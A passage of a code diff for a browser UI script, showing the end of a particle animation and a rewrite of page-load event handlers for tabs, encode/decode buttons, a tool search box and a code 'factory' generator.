+                particles.forEach(p => { p.update(); p.draw(); });
+            }, 16);
+        }
+    };
+})();
 
 document.addEventListener('DOMContentLoaded', () => {
     NebulaEngine.init();
+    Modules.updateScriptSelect();
     CoreUI.renderTools();
-    document.getElementById('btn-crypto').onclick = (e) => CoreUI.switchTab('mod-crypto', e.target);
-    document.getElementById('btn-factory').onclick = (e) => CoreUI.switchTab('mod-factory', e.target);
-    document.getElementById('btn-tools').onclick = (e) => CoreUI.switchTab('mod-tools', e.target);
-    document.getElementById('btn-encode').onclick = () => Modules.cryptoTransform(true);
-    document.getElementById('btn-decode').onclick = () => Modules.cryptoTransform(false);
-    document.getElementById('tool-search').onkeyup = (e) => {
-        const q = e.target.value.toLowerCase();
-        document.querySelectorAll('.tool-card').forEach(c => c.classList.toggle('hidden', !c.getAttribute('data-name').includes(q)));
-    };
+    document.getElementById('factory-lang').addEventListener('change', Modules.updateScriptSelect);
+    document.getElementById('btn-factory-gen').addEventListener('click', Modules.generateCode);
+    document.getElementById('btn-crypto-encode').addEventListener('click', () => Modules.cryptoTransform(true));
+    document.getElementById('btn-crypto-decode').addEventListener('click', () => Modules.cryptoTransform(false));
+    document.getElementById('tool-search').addEventListener('keyup', Modules.filterTools);
+    document.getElementById('main-nav').addEventListener('click', (e) => {
+        if(e.target.classList.contains('nav-btn')) CoreUI.switchTab(e.target.getAttribute('data-target'), e.target);
+    });
+    const ticker = document.getElementById('fps-ticker');
+    if(ticker) ticker.textContent = `KERNEL OPERATIVE // INTEL-X // © GPU-X`;
 });
